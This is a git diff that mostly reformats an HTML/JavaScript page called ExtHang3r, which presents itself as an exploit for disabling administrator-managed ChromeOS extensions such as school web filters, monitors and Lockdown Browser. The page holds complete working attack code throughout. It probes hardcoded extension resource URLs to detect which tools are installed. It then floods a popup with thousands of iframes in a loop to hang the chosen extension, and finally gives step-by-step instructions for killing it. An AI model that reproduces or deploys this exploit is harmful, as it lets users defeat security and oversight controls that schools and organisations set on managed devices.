@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -14,6 +15,7 @@
       background-color: #f8f9fa;
       color: #333;
     }
+
     header {
       background-color: #343a40;
       color: #fff;
@@ -24,11 +26,13 @@
       justify-content: center;
       box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
     }
+
     .logo {
       width: 50px;
       height: 50px;
       margin-right: 10px;
     }
+
     .container {
       max-width: 800px;
       margin: 150px auto 0 auto;
@@ -38,6 +42,7 @@
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       border-radius: 8px;
     }
+
     select {
       font-family: 'Varela Round', sans-serif;
       margin-bottom: 10px;
@@ -47,6 +52,7 @@
       border-radius: 4px;
       width: 100%;
     }
+
     button {
       font-family: 'Varela Round', sans-serif;
       background-color: #007bff;
@@ -59,9 +65,11 @@
       margin-top: 10px;
       transition: background-color 0.3s ease;
     }
+
     button:hover {
       background-color: #0056b3;
     }
+
     .overlay {
       position: fixed;
       top: 0;
@@ -78,6 +86,7 @@
       user-select: none;
       flex-direction: column;
     }
+
     .spinner {
       border: 6px solid rgba(255, 255, 255, 0.3);
       border-top: 6px solid #fff;
@@ -87,10 +96,17 @@
       animation: spin 1s linear infinite;
       margin-bottom: 20px;
     }
+
     @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
     }
+
     #killExtensionText {
       display: none;
       margin-top: 20px;
@@ -102,21 +118,23 @@
       border-radius: 8px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
     }
-   	 #killButton {
-	  display: none;
-	  background-color: #dc3545;
-	  color: #fff;
-	  border: none;
-	  padding: 10px 20px;
-	  font-size: 16px;
-	  cursor: pointer;
-	  border-radius: 5px;
- 	  transition: background-color 0.3s ease;
-	}
 
-	#killButton:hover {
-	  background-color: #9c1c28;
-	}
+    #killButton {
+      display: none;
+      background-color: #dc3545;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s ease;
+    }
+
+    #killButton:hover {
+      background-color: #9c1c28;
+    }
+
     footer {
       background-color: #343a40;
       color: #fff;
@@ -126,169 +144,172 @@
       bottom: 0;
       width: 100%;
     }
+
     footer a {
       color: #007bff;
       text-decoration: none;
     }
+
     footer a:hover {
       text-decoration: underline;
     }
   </style>
 </head>
+
 <body>
 
-<header>
-  <img src="https://blobby-boi.github.io/BlobbypassXSS/favicon.png" alt="Logo" class="logo">
-  <h1>ExtHang3r</h1>
-</header>
+  <header>
+    <img src="https://blobby-boi.github.io/BlobbypassXSS/favicon.png" alt="Logo" class="logo">
+    <h1>ExtHang3r</h1>
+  </header>
 
-<div class="container">
-  <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains unpatched in all new ChromeOS versions as of December 2024.</p>
-  <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
-  <select id="iframeSelect">
-  </select>
-  <button onclick="warning();" id="hangButton">Hang Extension!</button>
-  <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
-</div>
+  <div class="container">
+    <p>ExtHang3r is an exploit that allows ChromeOS users to kill managed extensions after the LTMEAT patch. It remains
+      unpatched in all new ChromeOS versions as of December 2024.</p>
+    <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
+    <select id="iframeSelect">
+    </select>
+    <button onclick="warning();" id="hangButton">Hang Extension!</button>
+    <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
+  </div>
 
-<div class="overlay" id="overlay">
-  <div class="spinner"></div>
-  Hanging... (This will take about 1 minute)
-</div>
-<div id="killExtensionText"></div>
+  <div class="overlay" id="overlay">
+    <div class="spinner"></div>
+    Hanging... (This will take about 1 minute)
+  </div>
+  <div id="killExtensionText"></div>
 
-<footer>
-  <p>Made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a></p>
-</footer>
+  <footer>
+    <p>Made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a></p>
+  </footer>
 
-<script>
-  async function checkExtensionURL(url) {
-    try {
-      const response = await fetch(url);
-      if (response.ok) {
-        return true;
-      } else {
+  <script>
+    async function checkExtensionURL(url) {
+      try {
+        const response = await fetch(url);
+        if (response.ok) {
+          return true;
+        } else {
+          return false;
+        }
+      } catch (error) {
         return false;
       }
-    } catch (error) {
-      return false;
     }
-  }
 
-  async function populateSelectOptions() {
-    const selectElement = document.getElementById("iframeSelect");
-    const extensions = {
-      "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
-      "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
-      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
-      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
-      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
-      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
-      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
-      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
-      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
-      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
-      "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
-      "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
-      "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
-      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
-      "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
-      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
-      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
-      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
-      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
-      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
-      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
-      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
-      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
-      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
-      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
-      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
-      "Lightspeed Alert Agent": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/main.js",
-      "Lightspeed Alert Agent 2": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/in_page.js",
-      "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
-      "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
-      "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
-    };
-    
-    let hasSupportedExtensions = false;
+    async function populateSelectOptions() {
+      const selectElement = document.getElementById("iframeSelect");
+      const extensions = {
+        "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
+        "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
+        "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
+        "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
+        "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
+        "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
+        "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
+        "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
+        "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
+        "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
+        "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
+        "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
+        "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
+        "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
+        "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
+        "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
+        "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
+        "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
+        "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
+        "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
+        "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
+        "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
+        "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
+        "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
+        "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
+        "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
+        "Lightspeed Alert Agent": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/main.js",
+        "Lightspeed Alert Agent 2": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/in_page.js",
+        "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
+        "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
+        "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
+      };
 
-    for (const [name, url] of Object.entries(extensions)) {
-      if (await checkExtensionURL(url)) {
+      let hasSupportedExtensions = false;
+
+      for (const [name, url] of Object.entries(extensions)) {
+        if (await checkExtensionURL(url)) {
+          const option = document.createElement("option");
+          option.value = url;
+          option.textContent = name;
+          selectElement.appendChild(option);
+          hasSupportedExtensions = true;
+        }
+      }
+
+      if (!hasSupportedExtensions) {
         const option = document.createElement("option");
-        option.value = url;
-        option.textContent = name;
+        option.value = "";
+        option.textContent = "No supported extensions installed";
         selectElement.appendChild(option);
-        hasSupportedExtensions = true;
-      }
-    }
-    
-    if (!hasSupportedExtensions) {
-      const option = document.createElement("option");
-      option.value = "";
-      option.textContent = "No supported extensions installed";
-      selectElement.appendChild(option);
-      document.getElementById("hangButton").style.display = "none";
-    }
-  }
-
-  populateSelectOptions();
-  
-  function replaceIframes(container, iframeSrc) {
-    for (var i = 0; i < 3000; i++) {
-      var iframe = document.createElement('iframe');
-      iframe.src = iframeSrc;
-      iframe.style.width = '100%';
-      iframe.style.height = '100px';
-      container.appendChild(iframe);
-    }
-    setTimeout(function() {
-      while (container.firstChild) {
-        container.removeChild(container.firstChild);
-      }
-      replaceIframes(container, iframeSrc);
-    }, 5);
-  }
-
-  function warning() {
-    var overlay = document.getElementById("overlay");
-    overlay.style.display = "flex";
-    var iframeSelect = document.getElementById("iframeSelect");
-    var selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
-    var selectedSrc = iframeSelect.value;
-    var popup = window.open("", "PopupWindow", "width=100,height=100");
-    var popupDocument = popup.document;
-    var popupBody = popupDocument.body;
-    var iframeContainer = popupDocument.createElement('div');
-    iframeContainer.id = 'iframeContainer';
-    popupBody.appendChild(iframeContainer);
-    replaceIframes(iframeContainer, selectedSrc);
-    setTimeout(function() {
-      popup.close();
-      var extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
-      var extensionURL = "chrome-extension://" + extensionId;
-      var killExtensionText = document.getElementById("killExtensionText");
-      killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been hanged, press the button above.";
-      setTimeout(function() {
-        overlay.style.display = "none";
-        killExtensionText.style.display = "block";
-        document.getElementById("killButton").style.display = "inline-block";
         document.getElementById("hangButton").style.display = "none";
-	document.getElementById("iframeSelect").style.display = "none";
-	document.getElementById("labelForIframeSelect").style.display = "none";
-        document.getElementById("killButton").setAttribute("data-url", selectedSrc);
-      }, 10000);
-    }, 5000);
-  }
+      }
+    }
 
-  function openExtensionPopup() {
-    var selectedSrc = document.getElementById("killButton").getAttribute("data-url");
-    var extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
-    var killExtensionText = document.getElementById("killExtensionText");
-    document.getElementById("killButton").style.display = "none";
-    killExtensionText.innerHTML = "Make sure to keep this tab open. Then in a new tab open <strong>chrome://extensions/?id=" + extensionId + "</strong> Flip the switch called allow access to file URLs twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.";
-    window.location.href = selectedSrc;
-  }
-</script>
+    populateSelectOptions();
+
+    function replaceIframes(container, iframeSrc) {
+      for (let i = 0; i < 3000; i++) {
+        const iframe = document.createElement('iframe');
+        iframe.src = iframeSrc;
+        iframe.style.width = '100%';
+        iframe.style.height = '100px';
+        container.appendChild(iframe);
+      }
+      setTimeout(function () {
+        while (container.firstChild) {
+          container.removeChild(container.firstChild);
+        }
+        replaceIframes(container, iframeSrc);
+      }, 5);
+    }
+
+    function warning() {
+      const overlay = document.getElementById("overlay");
+      overlay.style.display = "flex";
+      const iframeSelect = document.getElementById("iframeSelect");
+      const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
+      const selectedSrc = iframeSelect.value;
+      const popup = window.open("", "PopupWindow", "width=100,height=100");
+      const popupDocument = popup.document;
+      const popupBody = popupDocument.body;
+      const iframeContainer = popupDocument.createElement('div');
+      iframeContainer.id = 'iframeContainer';
+      popupBody.appendChild(iframeContainer);
+      replaceIframes(iframeContainer, selectedSrc);
+      setTimeout(function () {
+        popup.close();
+        const killExtensionText = document.getElementById("killExtensionText");
+        killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been hanged, press the button above.";
+        setTimeout(function () {
+          overlay.style.display = "none";
+          killExtensionText.style.display = "block";
+          document.getElementById("killButton").style.display = "inline-block";
+          document.getElementById("hangButton").style.display = "none";
+          document.getElementById("iframeSelect").style.display = "none";
+          document.getElementById("labelForIframeSelect").style.display = "none";
+          document.getElementById("killButton").setAttribute("data-url", selectedSrc);
+        }, 10000);
+      }, 5000);
+    }
+
+    function openExtensionPopup() {
+      const selectedSrc = document.getElementById("killButton").getAttribute("data-url");
+      const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
+      const killExtensionText = document.getElementById("killExtensionText");
+      document.getElementById("killButton").style.display = "none";
+      killExtensionText.innerHTML = "Make sure to keep this tab open. Then open <strong>chrome://extensions/?id=" + extensionId + "</strong> and flip the switch called \"Allow access to file URLs\" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.";
+      window.location.href = selectedSrc;
+    }
+  </script>
 </body>
+
 </html>
